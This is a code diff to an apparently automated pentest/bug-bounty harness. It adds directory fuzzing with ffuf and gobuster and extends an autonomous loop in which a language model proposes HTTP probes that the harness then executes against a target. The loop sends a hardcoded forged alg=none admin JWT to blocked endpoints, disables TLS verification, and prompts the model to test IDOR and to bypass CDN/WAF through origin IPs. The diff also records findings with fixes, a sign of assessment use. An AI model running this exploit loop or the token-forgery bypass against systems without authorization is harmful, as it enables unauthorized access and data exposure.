@@ -362,7 +362,7 @@ def save_scan_history(eid):
         "events": eng.get("events", [])[-200:],
     }
     # Include BB findings if they exist
-    for key in ["bb_takeover","bb_cors","bb_open_redirect","bb_injection","bb_webapp","bb_health_endpoints","bb_dirbust","bb_tech","secrets","pd_nuclei","missing_security_headers","wayback","bb_new_subdomains","api_endpoints","subdomains","ports","http","waf","csp","s3","origins","whois","dns","bb_origins","bb_login","bb_sourcemap","bb_wayback","bb_default_creds","bb_jwt","ai_0day_hypotheses","bb_api","bb_js","bb_waf","bb_openapi","bb_origin_retest","bb_cf_hunt","bb_attack","bb_ptt","bb_agentic"]:
+    for key in ["bb_takeover","bb_cors","bb_open_redirect","bb_injection","bb_webapp","bb_health_endpoints","bb_dirbust","bb_tech","secrets","pd_nuclei","missing_security_headers","wayback","bb_new_subdomains","api_endpoints","subdomains","ports","http","waf","csp","s3","origins","whois","dns","bb_origins","bb_login","bb_sourcemap","bb_wayback","bb_default_creds","bb_jwt","ai_0day_hypotheses","bb_api","bb_js","bb_waf","bb_openapi","bb_origin_retest","bb_cf_hunt","bb_attack","bb_ptt","bb_agentic","bb_validations","bb_fuzz","bb_agentic_findings"]:
         val = eng.get(key)
         if val:
             record[key] = val
@@ -741,6 +741,97 @@ def pd_urlfinder(domain, timeout=30):
         line = line.strip()
         if line and "://" in line: urls.add(line)
     return sorted(urls)
+
+def pd_assetfinder(domain, timeout=30):
+    """Run assetfinder for additional passive subdomain enumeration."""
+    ok, out = run_pd("assetfinder", ["-subs-only", domain], timeout)
+    if not ok or not out: return None
+    subs = set()
+    for line in out.strip().splitlines():
+        line = line.strip()
+        if line and "." in line:
+            subs.add(line)
+    return sorted(subs)
+
+def pd_ffuf(url, wordlist=None, timeout=40):
+    """Run ffuf for fast content/directory fuzzing. Returns list of
+    {url, status, size, words, lines}. Skips when no wordlist is available."""
+    import tempfile as _tf
+    wl = wordlist or _ffuf_wordlist()
+    if not wl:
+        return None
+    out_json = None
+    try:
+        fd, out_json = _tf.mkstemp(suffix=".json")
+        os.close(fd)
+        ok, out = run_pd("ffuf", ["-u", url.rstrip("/") + "/FUZZ", "-w", wl, "-mc", "200,201,204,301,302,307,401,403", "-t", "10", "-s", "-o", out_json] + stealth.pd_flags("ffuf"), timeout)
+        if not ok:
+            return None
+        with open(out_json, "r", encoding="utf-8") as fh:
+            j = json.load(fh)
+        results = []
+        for r in (j.get("results") or []):
+            results.append({
+                "url": r.get("url", ""),
+                "status": r.get("status"),
+                "size": r.get("length", ""),
+                "words": r.get("words", ""),
+                "lines": r.get("lines", ""),
+            })
+        return results
+    except Exception:
+        return None
+    finally:
+        if out_json:
+            try: os.unlink(out_json)
+            except Exception: pass
+
+def pd_gobuster(url, wordlist=None, timeout=40):
+    """Run gobuster dir for directory brute force. Returns list of
+    {url, status, size}. Skips when no wordlist is available."""
+    wl = wordlist or _ffuf_wordlist()
+    if not wl:
+        return None
+    try:
+        ok, out = run_pd("gobuster", ["dir", "-u", url.rstrip("/"), "-w", wl, "-t", "10", "-q", "-s", "200,204,301,302,307,401,403", "--no-error"], timeout)
+    except Exception:
+        return None
+    if not ok or not out:
+        return None
+    results = []
+    for line in out.strip().splitlines():
+        m = re.match(r"(\S+)\s+\(Status:\s*(\d+)\)(?:\s+\[Size:\s*(\d+)\])?", line)
+        if m:
+            results.append({"url": m.group(1), "status": int(m.group(2)), "size": m.group(3) or ""})
+    return results
+
+_FFUF_WL = None
+def _ffuf_wordlist():
+    """Locate a usable wordlist for ffuf/gobuster (seclists or the harness's own)."""
+    global _FFUF_WL
+    if _FFUF_WL:
+        return _FFUF_WL
+    import glob as _glob
+    candidates = [
+        "/usr/share/seclists/Discovery/Web-Content/common.txt",
+        "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt",
+        "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt",
+        "/usr/share/wordlists/dirb/common.txt",
+        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+        "/opt/seclists/Discovery/Web-Content/common.txt",
+    ]
+    if globals().get("WORDLIST_DIR"):
+        candidates.append(str(WORDLIST_DIR / "directories.txt"))
+    for c in candidates:
+        if c and os.path.isfile(c):
+            _FFUF_WL = c
+            return c
+    for pat in ["/usr/share/**/common.txt", "/opt/**/Discovery/Web-Content/common.txt"]:
+        for hit in _glob.glob(pat, recursive=True):
+            if os.path.isfile(hit):
+                _FFUF_WL = hit
+                return hit
+    return None
 
 def pd_vulnx(service, timeout=15):
     """Run vulnx for CVE lookup by service name."""
@@ -2242,55 +2333,155 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
     """PentestGPT-style autonomous loop: the LLM proposes the next concrete
     exploit action from current findings, the harness executes it, and the
     outcome feeds back as context for the next proposal. Safe, read-only,
-    bounded probes — never destructive, never privilege-escalating."""
+    bounded probes — never destructive, never privilege-escalating.
+
+    Unlike a naive loop, it builds a real attack surface from every recon
+    artifact (live URLs, OpenAPI spec paths, JS-discovered API endpoints,
+    dirbust results, confirmed origin IPs) so the model targets the actual
+    endpoints recon found instead of guessing generic paths."""
     import json as _json
     steps = []
     history = []
     base_urls = [u for u in (urls or []) if "://" in u][:6]
 
+    def _add_surface(surface, seen, u, why):
+        if not u or "://" not in u:
+            return
+        u = u.split("#")[0]
+        if u in seen:
+            return
+        seen.add(u)
+        surface.append({"url": u, "why": why})
+
+    def _build_surface():
+        surface, seen = [], set()
+        for u in (urls or [])[:8]:
+            _add_surface(surface, seen, u, "live")
+        roots = [u.rstrip("/").split("?")[0] for u in (urls or [])[:3] if "://" in u]
+        for ep in (data.get("api_endpoints") or [])[:40]:
+            if ep.startswith("http"):
+                _add_surface(surface, seen, ep, "api(js)")
+            elif roots:
+                _add_surface(surface, seen, roots[0] + ep, "api(js)")
+        for host, paths in (data.get("bb_dirbust") or {}).items():
+            for p in (paths or [])[:8]:
+                if isinstance(p, (tuple, list)) and len(p) > 0:
+                    p = p[0]
+                if not isinstance(p, str) or not p:
+                    continue
+                _add_surface(surface, seen, host.rstrip("/") + (p if p.startswith("/") else "/" + p), "dir")
+        for f in (data.get("bb_openapi") or []):
+            if f.get("url") and "://" in f.get("url", ""):
+                _add_surface(surface, seen, f["url"], "spec")
+            if f.get("kind") == "openapi_paths":
+                for ep in (f.get("endpoints") or [])[:30]:
+                    if ep.startswith("http"):
+                        _add_surface(surface, seen, ep, "openapi")
+                    elif roots:
+                        _add_surface(surface, seen, roots[0] + ep, "openapi")
+        for o in (data.get("bb_origins") or []):
+            if o.get("confirmed") and o.get("ip"):
+                _add_surface(surface, seen, f"http://{o['ip']}/", "origin")
+        return surface[:40]
+
     def _safe_exec(command):
         """Parse an LLM-proposed command string like
-        'GET /api/user?id=1' or 'GET https://host/path' into a real request."""
+        'GET /api/user?id=1', 'GET https://host/path',
+        'POST /api/x {"a":"b"}', or 'POST /api/x a=1&b=2' into a real
+        request. JSON body when the payload starts with '{'/'[', form-encoded
+        otherwise. Returns status, headers, body, content-type."""
         command = (command or "").strip()
         try:
-            parts = command.split()
+            parts = command.split(None, 2)
             method = parts[0].upper() if parts else "GET"
             target = parts[1] if len(parts) > 1 else ""
+            payload = parts[2] if len(parts) > 2 else ""
             if not target.startswith("http"):
                 host = base_urls[0].split("?")[0] if base_urls else f"https://{domain}/"
                 base = host.rstrip("/")
-                if target.startswith("/"):
-                    target = base + target
+                target = base + (target if target.startswith("/") else "/" + target)
+            headers = {}
+            body = None
+            if method == "POST" and payload:
+                if payload.lstrip().startswith(("{", "[")):
+                    headers["Content-Type"] = "application/json"
+                    body = payload.encode()
                 else:
-                    target = base + "/" + target
-            if method in ("GET", "POST"):
-                headers = {}
-                body = None
-                if method == "POST" and len(parts) > 2 and "=" in command:
+                    headers["Content-Type"] = "application/x-www-form-urlencoded"
+                    body = payload.encode()
+            if method in ("GET", "HEAD", "POST"):
+                req = urllib.request.Request(target, data=body, headers={**stealth.headers(), **headers}, method=method)
+                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+                try:
+                    resp = urllib.request.urlopen(req, timeout=8, context=ctx)
+                    st, hdrs, body_txt = resp.status, dict(resp.headers), resp.read().decode("utf-8", errors="ignore")
+                except urllib.error.HTTPError as e:
+                    st, hdrs = e.code, dict(e.headers or {})
                     try:
-                        body = "&".join(parts[2:])
+                        body_txt = e.read().decode("utf-8", errors="ignore")
                     except Exception:
-                        body = None
-                st, hdrs, body_txt = http_get_retry(target, timeout=8, extra_headers=headers)
-                return {"status": st, "evidence": (body_txt or "")[:300], "method": method, "url": target}
-            return {"status": 0, "evidence": "unsupported method"}
+                        body_txt = ""
+                except Exception as e:
+                    return {"status": 0, "evidence": f"exec error: {e}", "method": method, "url": target}
+                return {
+                    "status": st, "method": method, "url": target,
+                    "content_type": hdrs.get("Content-Type", ""),
+                    "evidence": (body_txt or "")[:400],
+                    "set_cookie": (hdrs.get("Set-Cookie") or "")[:100],
+                }
+            return {"status": 0, "evidence": "unsupported method", "method": method, "url": target}
         except Exception as e:
             return {"status": 0, "evidence": f"exec error: {e}"}
+
+    def _classify(r):
+        st = r.get("status")
+        if not st:
+            return "error"
+        ct = (r.get("content_type") or "").lower()
+        if st in (200, 201, 202) and "json" in ct:
+            return "api-open"
+        if st in (200, 201, 202, 204):
+            return "ok"
+        if st in (301, 302, 303, 307, 308):
+            return "redirect"
+        if st in (401, 403):
+            return "blocked-auth"
+        if st in (400, 404, 405):
+            return "not-found"
+        if st >= 500:
+            return "server-error"
+        return "no-signal"
+
+    surface = _build_surface()
+    surf_txt = "\n".join(f"- {s['url']}  [{s['why']}]" for s in surface)
+    origin_txt = ", ".join(o.get("ip", "") for o in (data.get("bb_origins") or []) if o.get("confirmed"))
 
     for i in range(iterations):
         try:
             prompt_lines = [
                 "You are driving an autonomous penetration test as the 'generation' session.",
                 f"Target: {domain}",
-                "Findings so far:",
-                *(f"- {f.get('severity','?')}: {f.get('type','?')} @ {f.get('url','?')} ({f.get('evidence','')[:120]})"
-                  for f in (data.get('bb_attack') or [])[:8]),
-                *(f"- origin IP {o.get('ip')} ({o.get('host','')})" for o in (data.get('bb_origins') or [])[:5] if o.get('confirmed')),
-                "Previous steps:",
-                *(f"- {s.get('command')} -> {s.get('outcome')} ({s.get('evidence','')[:100]})" for s in history),
                 "",
-                "Propose ONE next concrete, LOW-RISK read-only probe (a single GET/POST request) that could confirm or extend a finding.",
-                "Reply with ONLY a single line: GET <url-with-param> or POST <url> key=value",
+                "KNOWN ATTACK SURFACE (from recon — prefer these over guessing):",
+                surf_txt if surf_txt else "- none discovered",
+                (f"Confirmed origin IPs (bypass CDN/WAF): {origin_txt}" if origin_txt else ""),
+                "",
+                "Findings so far:",
+                *(f"- {f.get('severity','?')}: {f.get('type','?')} @ {f.get('url','?')} ({f.get('evidence','')[:110]})"
+                  for f in (data.get('bb_attack') or [])[:8]),
+                *(f"- {f.get('issue','?')}: {f.get('url','?')} ({f.get('evidence','')[:110]})" for f in (data.get('bb_jwt') or [])[:5]),
+                *(f"- CORS {f.get('origin','*')} on {f.get('url','?')}" for f in (data.get('bb_cors') or [])[:5]),
+                *(f"- VALIDATION {f.get('severity','?')}: {f.get('title') or f.get('type','?')} @ {f.get('url','?')} ({f.get('evidence','')[:100]})" for f in (data.get('bb_validations') or [])[:8]),
+                "Previous steps:",
+                *(f"- {s.get('command')} -> {s.get('outcome')} ({s.get('evidence','')[:90]})" for s in history),
+                "",
+                "Propose ONE next concrete, LOW-RISK read-only probe (a single GET/POST request) that confirms or extends a finding.",
+                "Prefer the KNOWN ATTACK SURFACE endpoints. For API endpoints, test for IDOR/authz by tampering ids or missing tokens.",
+                "If you must probe an endpoint that looks like it needs auth, still try it once unauthenticated.",
+                "Reply with ONLY a single line, one of:",
+                "  GET <url-with-param>",
+                "  POST <url> key=value&key2=value2",
+                "  POST <url> {\"key\":\"value\"}",
                 "If no further safe step is worthwhile, reply exactly: DONE",
             ]
             resp = call_model(base_url, model, api_key, [
@@ -2300,14 +2491,36 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
             if resp.startswith("AI_ERROR"):
                 break
             command = resp.strip().splitlines()[0].strip()
-            if command.upper() == "DONE" or not command:
+            if not command or command.upper() == "DONE":
                 break
             result = _safe_exec(command)
-            outcome = "ok" if result.get("status") in (200, 301, 302) else ("found" if result.get("status") and result.get("status") < 400 else "no-signal")
+            outcome = _classify(result)
+            if outcome == "blocked-auth":
+                # retry the same target once with a forged alg=none JWT to test authz
+                target = result.get("url", "")
+                if target:
+                    forged = urllib.request.Request(target, headers={
+                        "User-Agent": "Mozilla/5.0",
+                        "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0.e30",
+                    })
+                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+                    try:
+                        r2 = urllib.request.urlopen(forged, timeout=8, context=ctx)
+                        st2, b2 = r2.status, r2.read().decode("utf-8", errors="ignore")
+                    except urllib.error.HTTPError as e:
+                        st2, b2 = e.code, ""
+                    except Exception:
+                        st2, b2 = 0, ""
+                    if st2 not in (401, 403):
+                        result["evidence"] = f"unauth={result['status']}, alg=none JWT={st2} — authz bypass" + (" | " + b2[:200] if b2 else "")
+                        result["status"] = st2
+                        result["jwt_bypass"] = True
+                        outcome = "auth-bypass"
             step = {
                 "iter": i + 1, "command": command[:200], "method": result.get("method", "GET"),
                 "url": result.get("url", ""), "status": result.get("status"),
                 "outcome": outcome, "evidence": result.get("evidence", "")[:300],
+                "jwt_bypass": result.get("jwt_bypass", False),
             }
             steps.append(step)
             history.append(step)
@@ -2316,6 +2529,45 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
         except Exception:
             break
     return steps
+
+def _agentic_to_findings(agentic):
+    """Promote high-signal agentic outcomes into finding dicts for the scorecard.
+
+    api-open on an endpoint not previously known to be unauthenticated is treated
+    as a missing-authentication / broken-access-control finding (CWE-306). An
+    auth-bypass (forged JWT changed the status code) is CWE-287. A 2xx that is
+    not JSON is left to the attack battery. Evidence is the first 220 chars of
+    the step's response body, which may contain leaked data.
+    """
+    out = []
+    seen = set()
+    for s in (agentic or []):
+        key = (s.get("outcome"), s.get("url"))
+        if key in seen:
+            continue
+        seen.add(key)
+        outcome = s.get("outcome")
+        url = s.get("url", "")
+        if not url:
+            continue
+        ev = (s.get("evidence") or "").strip()[:220]
+        if outcome == "api-open":
+            out.append({
+                "severity": "medium", "type": "api_unauthenticated",
+                "title": "Unauthenticated API endpoint returns data",
+                "url": url, "asset": url, "evidence": ev or f"Agentic probe returned HTTP {s.get('status')} JSON.",
+                "cwe": "CWE-306", "score": 60,
+                "fix": "Require authentication on this API endpoint; verify it is not public.",
+            })
+        elif outcome == "auth-bypass":
+            out.append({
+                "severity": "high", "type": "auth_bypass",
+                "title": "Authentication bypass via forged token",
+                "url": url, "asset": url, "evidence": ev or f"Forged alg=none JWT changed response from {s.get('status')}.",
+                "cwe": "CWE-287", "score": 85,
+                "fix": "Reject alg=none tokens; validate JWT signature and algorithm whitelist.",
+            })
+    return out
 
 def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
     """Full active attack battery. Builds its own attack surface from every
@@ -3132,6 +3384,14 @@ def generate_report(data):
         sev_summary = ", ".join(f"{k.upper()} {v}" for k, v in sorted(attack_by_sev.items()))
         lines.append(f"- **Active Exploit Findings:** {len(attack)} ({sev_summary})")
         lines.append(f"- **Exploitable Types:** {', '.join(sorted(set(f.get('type', '?') for f in attack))[:8])}")
+    validations = data.get("bb_validations", [])
+    if validations:
+        val_by_sev = {}
+        for f in validations:
+            val_by_sev[f.get("severity", "low")] = val_by_sev.get(f.get("severity", "low"), 0) + 1
+        val_summary = ", ".join(f"{k.upper()} {v}" for k, v in sorted(val_by_sev.items()))
+        lines.append(f"- **Web Configuration Validations:** {len(validations)} findings ({val_summary})")
+        lines.append(f"- **Validation Types:** {', '.join(sorted(set(f.get('type', '?') for f in validations))[:8])}")
     ptt = data.get("bb_ptt")
     if ptt and ptt.get("nodes"):
         unresolved = [n for n in ptt["nodes"] if n.get("status") == "unresolved"]
@@ -3139,6 +3399,9 @@ def generate_report(data):
     agentic = data.get("bb_agentic")
     if agentic:
         lines.append(f"- **Agentic Exploit Steps:** {len(agentic)} LLM-proposed probes executed")
+    agentic_findings = data.get("bb_agentic_findings", [])
+    if agentic_findings:
+        lines.append(f"- **Agentic Discovered Findings:** {len(agentic_findings)} (unauthenticated API / auth-bypass)")
     lines.append("")
 
     if data.get("ai_analysis"):
@@ -3397,6 +3660,20 @@ def generate_report(data):
             lines.append(f"- `{c.get('url', '?')}` — {c.get('issue', '?')} (severity: {c.get('severity', '?')})")
         lines.append("")
 
+    validations = data.get("bb_validations", [])
+    if validations:
+        lines.append("## Web Configuration Validations")
+        lines.append("")
+        lines.append("| # | Severity | Check | Target | Evidence |")
+        lines.append("|---|----------|-------|--------|----------|")
+        for i, v in enumerate(sorted(validations, key=lambda x: -x.get("score", 0))[:30], 1):
+            lines.append(f"| {i} | {v.get('severity', '')} | {str(v.get('title', '') or v.get('type', ''))[:50]} | {v.get('url', '')} | `{str(v.get('evidence', ''))[:80]}` |")
+        lines.append("")
+        for v in sorted(validations, key=lambda x: -x.get("score", 0))[:15]:
+            if v.get("fix"):
+                lines.append(f"- **{v.get('title', '') or v.get('type', '')}** → {v.get('fix', '')}")
+        lines.append("")
+
     redirects = data.get("bb_open_redirect", [])
     if redirects:
         lines.append("## Open Redirect Tests")
@@ -3452,6 +3729,16 @@ def generate_report(data):
         for s in agentic:
             ev = (s.get("evidence") or "")[:80].replace("|", "/")
             lines.append(f"| {s.get('iter','?')} | `{s.get('command','')[:90]}` | {s.get('method','GET')} | {s.get('status','?')} | {s.get('outcome','')} | {ev} |")
+        lines.append("")
+
+    agentic_findings = data.get("bb_agentic_findings", [])
+    if agentic_findings:
+        lines.append("## Agentic Discovered Findings")
+        lines.append("")
+        lines.append("| Severity | Finding | Endpoint | Evidence |")
+        lines.append("|----------|---------|----------|----------|")
+        for f in agentic_findings:
+            lines.append(f"| {f.get('severity','?')} | {f.get('title','?')} | `{f.get('url','?')}` | {str(f.get('evidence',''))[:90].replace('|','/')} |")
         lines.append("")
 
     health = data.get("bb_health_endpoints", [])
@@ -3915,8 +4202,8 @@ def run_oneshot(eid):
         emit_ir("usage", {"interval": "cumulative", "usage": {"cost_usd": 0.01}})
 
         # Phase 2: Subdomains
-        log_state("Discovering subdomains (PD subfinder)...")
-        emit_ir("message", {"role": "assistant_thinking", "text": f"Running ProjectDiscovery subfinder and crt.sh for subdomain enumeration..."})
+        log_state("Discovering subdomains (PD subfinder + assetfinder)...")
+        emit_ir("message", {"role": "assistant_thinking", "text": f"Running ProjectDiscovery subfinder, assetfinder and crt.sh for subdomain enumeration..."})
         pd_subs = pd_subfinder(apex)
         if pd_subs is not None and len(pd_subs) > 3:
             subs = pd_subs
@@ -3924,6 +4211,13 @@ def run_oneshot(eid):
         else:
             emit_ir("message", {"role": "assistant_thinking", "text": f"Falling back to crt.sh + wordlist enumeration..."})
             subs = discover_subdomains(apex)
+        # assetfinder supplement (passive, additive)
+        af_subs = pd_assetfinder(apex)
+        if af_subs:
+            before = len(subs)
+            subs = sorted(set(subs + af_subs))
+            if len(subs) > before:
+                emit_ir("message", {"role": "assistant", "text": f"assetfinder added **{len(subs) - before}** more subdomains (total {len(subs)})."})
         subs = sorted(set(subs + [apex]))
         if domain != apex and domain not in subs:
             subs.insert(0, domain)
@@ -4186,6 +4480,24 @@ def run_oneshot(eid):
             emit_ir("message", {"role": "assistant", "text": f"katana discovered **{len(data['pd_katana'])}** endpoints across {len(katana_targets)} targets."})
         emit_ir("tool.result", {"call_id": f"kat-{eid}", "status": "ok" if pd_crawled else "empty", "result": f"{len(pd_crawled)} endpoints"})
 
+        # Phase 11b: Content fuzzing (ffuf / gobuster) — if installed + wordlist
+        log_state("Content fuzzing (ffuf/gobuster)...")
+        emit_ir("tool.call", {"call_id": f"ffuf-{eid}", "name": "Content fuzzing", "target": domain, "category": "search"})
+        fuzz_findings = []
+        fuzz_targets = [u for u in list(http_results.keys())[:3]]
+        for ft in fuzz_targets:
+            if len(fuzz_findings) >= 40:
+                break
+            res = pd_ffuf(ft) or []
+            if not res:
+                res = pd_gobuster(ft) or []
+            for r in res:
+                fuzz_findings.append({"url": r.get("url", ""), "status": r.get("status"), "size": r.get("size", r.get("words", ""))})
+        if fuzz_findings:
+            data["bb_fuzz"] = fuzz_findings
+            emit_ir("message", {"role": "assistant", "text": f"ffuf/gobuster fuzzed **{len(fuzz_targets)}** targets and found **{len(fuzz_findings)}** interesting paths."})
+        emit_ir("tool.result", {"call_id": f"ffuf-{eid}", "status": "ok" if fuzz_findings else "empty", "result": f"{len(fuzz_findings)} paths"})
+
         # Phase 12: Exploit Chain (when model + ports available)
         if ports and base_url and model and api_key:
             log_state("Analyzing exploit chains for open ports...")
@@ -4389,6 +4701,9 @@ def run_oneshot(eid):
         for t, paths in (dirbust_results or {}).items():
             for pth, code, ln in paths:
                 discovered_urls.append(t.rstrip("/") + "/" + pth)
+        for fz in (data.get("bb_fuzz") or []):
+            if fz.get("url") and fz["url"] not in discovered_urls:
+                discovered_urls.append(fz["url"])
         host_map = {}
         for h in ([domain] + list(data.get("subdomains") or []))[:40]:
             try:
@@ -4632,6 +4947,27 @@ def run_oneshot(eid):
                 emit_ir("message", {"role": "assistant", "text": f"**{f.get('severity','').upper()}**: {f.get('type','?')} at `{f.get('url','?')}` ({f.get('evidence','')})"})
         emit_ir("tool.result", {"call_id": f"bb-attack-{eid}", "status": "ok" if attack_results else "empty", "result": f"{len(attack_results)} exploit probes"})
 
+        # BB22b: Web configuration validations (TLS/ciphers/cert, HTTP methods,
+        # cookie flags, directory listing, admin exposure, unauthenticated API,
+        # info disclosure, rate limiting, security.txt, CORS credentials,
+        # host-header injection, cache indicators, CSP bypass, clickjacking,
+        # CRLF injection, open redirects).
+        log_state("Running web configuration validations (TLS/methods/cookies/CORS/CSP/redirects)...")
+        emit_ir("tool.call", {"call_id": f"bb-val-{eid}", "name": "Web configuration validations", "target": domain, "category": "read"})
+        try:
+            from webvalidations import bb_web_validation as _bb_web_validation
+            validations = _run_bb(f"bb-val-{eid}", "Web config validations", domain, "read", lambda: _bb_web_validation(list(live_urls)[:8], list(api_eps), domain=domain, timeout=280), timeout=300)
+            if validations:
+                data["bb_validations"] = validations
+                med_plus = sum(1 for f in validations if f.get("severity") in ("high", "critical"))
+                emit_ir("message", {"role": "assistant", "text": f"**Web config validations**: **{len(validations)}** findings ({med_plus} high+) — TLS, HTTP methods, cookies, CSP, redirects, etc."})
+                for f in validations[:5]:
+                    emit_ir("message", {"role": "assistant", "text": f"**{f.get('severity','').upper()}**: {f.get('title') or f.get('type','?')} at `{f.get('url','?')}`"})
+            emit_ir("tool.result", {"call_id": f"bb-val-{eid}", "status": "ok" if validations else "empty", "result": f"{len(validations)} validation findings"})
+        except Exception as e:
+            emit_ir("error", {"scope": "webvalidations", "class": type(e).__name__, "message": str(e)[:120]})
+            emit_ir("tool.result", {"call_id": f"bb-val-{eid}", "status": "error", "result": str(e)[:100]})
+
         # BB23: Pentest Task Tree (PTT) + agentic exploit loop (PentestGPT-style).
         # Builds a live task tree of the engagement and, when a model is configured,
         # runs an autonomous loop: LLM proposes the next concrete exploit step based
@@ -4649,8 +4985,13 @@ def run_oneshot(eid):
         if base_url and model and api_key and (attack_results or data.get("bb_origins") or data.get("bb_cors")):
             log_state("Running autonomous agentic exploit loop (LLM-proposed steps)...")
             emit_ir("tool.call", {"call_id": f"bb-agentic-{eid}", "name": "Agentic exploit loop", "target": domain, "category": "exploit"})
-            agentic = _agentic_exploit_loop(domain, live_urls, data, base_url, model, api_key, iterations=4, emit=lambda m: emit_ir("message", {"role": "assistant", "text": m}))
+            agentic = _agentic_exploit_loop(domain, live_urls, data, base_url, model, api_key, iterations=6, emit=lambda m: emit_ir("message", {"role": "assistant", "text": m}))
             data["bb_agentic"] = agentic
+            agentic_findings = _agentic_to_findings(agentic)
+            if agentic_findings:
+                data.setdefault("bb_agentic_findings", []).extend(agentic_findings)
+                data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + (data.get("bb_attack") or []) + (data.get("bb_validations") or []) + (data.get("bb_agentic_findings") or []) + eng.get("findings", [])
+                emit_ir("message", {"role": "assistant", "text": f"**Agentic discoveries**: **{len(agentic_findings)}** new finding(s) promoted from exploit loop."})
             emit_ir("message", {"role": "assistant", "text": f"**Agentic exploit loop**: executed **{len(agentic)}** LLM-proposed steps."})
             for step in agentic:
                 emit_ir("message", {"role": "assistant", "text": f"Step `{step.get('command','')[:80]}` → **{step.get('outcome','')}** ({step.get('evidence','')[:160]})"})
@@ -4867,7 +5208,7 @@ RULES:
 
         # Generate report
         log_state("Generating report...")
-        data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + (data.get("bb_attack") or []) + eng.get("findings", [])
+        data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + (data.get("bb_attack") or []) + (data.get("bb_validations") or []) + (data.get("bb_agentic_findings") or []) + eng.get("findings", [])
         data["scope"] = eng.get("scope", [])
         data["exclusions"] = eng.get("exclusions", [])
         report = generate_report(data)
